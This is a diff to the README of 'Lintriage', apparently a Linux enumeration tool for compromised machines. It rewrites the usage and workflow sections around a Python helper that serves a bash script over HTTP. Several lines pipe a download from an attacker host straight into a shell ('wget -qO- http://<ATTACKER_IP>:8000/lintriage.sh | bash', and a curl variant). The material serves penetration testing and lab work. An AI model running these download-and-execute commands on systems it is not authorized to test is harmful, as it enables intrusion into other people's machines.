@@ -37,22 +37,30 @@ cd Lintriage
 
 ## Usage
 
-### Serving the Build (Attacker Machine)
+### Lintriage Helper (Attacker Machine)
 
-On your attacker machine, use the Python script to serve the bash build:
+The `lintriage.py` script is a beautiful helper tool for serving and managing builds:
 
 ```bash
+# Show information and help
+python3 lintriage.py info
+
+# Check build status
+python3 lintriage.py status
+
 # Start the build server (default port 8000)
 python3 lintriage.py serve
 
-# Or specify a custom port
+# Start server on custom port
 python3 lintriage.py serve --port 8080
 ```
 
-The server will display:
-- Local and network URLs to download the script
-- Ready-to-use `wget` and `curl` commands
-- Instructions for making the script executable
+The helper provides:
+- **Beautiful console UI** with color-coded output and box formatting
+- **Build information** - file size, modification date, status
+- **Download commands** - ready-to-use wget/curl commands displayed nicely
+- **Server status** - real-time connection logging
+- **Network detection** - automatically shows local and network URLs
 
 ### Downloading on Target Machine
 
@@ -79,18 +87,6 @@ wget -qO- http://<ATTACKER_IP>:8000/lintriage.sh | bash
 
 # Or with curl
 curl -s http://<ATTACKER_IP>:8000/lintriage.sh | bash
-```
-
-### Running Locally (Linux Only)
-
-If you're already on a Linux system, you can run the Python version directly:
-
-```bash
-# Run as regular user (some checks may be limited)
-python3 lintriage.py
-
-# Run as root for comprehensive checks
-sudo python3 lintriage.py
 ```
 
 **Note:** The bash script (`lintriage.sh`) in the `builds/` directory is designed for easy upload and execution on target Linux machines. It requires no Python or additional dependencies - just standard Linux utilities.
@@ -154,20 +150,33 @@ Lintriage organizes findings into three severity levels:
 
 ```
 Lintriage/
-├── lintriage.py          # Main Python script (run locally or serve builds)
+├── lintriage.py          # Helper tool (build server & management)
 ├── builds/
 │   └── lintriage.sh      # Bash script build (served to target machines)
 ├── README.md
 └── LICENSE
 ```
 
+### Components
+
+- **`lintriage.py`** - Beautiful helper tool with console UI for serving builds
+- **`builds/lintriage.sh`** - The actual enumeration script (bash, no dependencies)
+
 ## Workflow
 
-1. **On attacker machine:** Run `python3 lintriage.py serve` to start the HTTP server
-2. **On target machine:** Download the script using `wget` or `curl`
-3. **On target machine:** Execute `./lintriage.sh` to run the enumeration
+1. **On attacker machine:** 
+   - Run `python3 lintriage.py serve` to start the HTTP server
+   - The helper will display beautiful UI with download commands
+   
+2. **On target machine:** 
+   - Copy one of the displayed download commands (wget/curl)
+   - Or use the one-liner: `wget -qO- http://<IP>:8000/lintriage.sh | bash`
+   
+3. **On target machine:** 
+   - Execute `./lintriage.sh` to run the enumeration
+   - Or use the one-liner for direct execution
 
-This workflow allows you to easily transfer and execute the tool on compromised Linux systems without needing to manually upload files or install dependencies.
+This workflow allows you to easily transfer and execute the tool on compromised Linux systems without needing to manually upload files or install dependencies. The helper tool provides a beautiful, user-friendly interface for managing the entire process.
 
 ## License
 
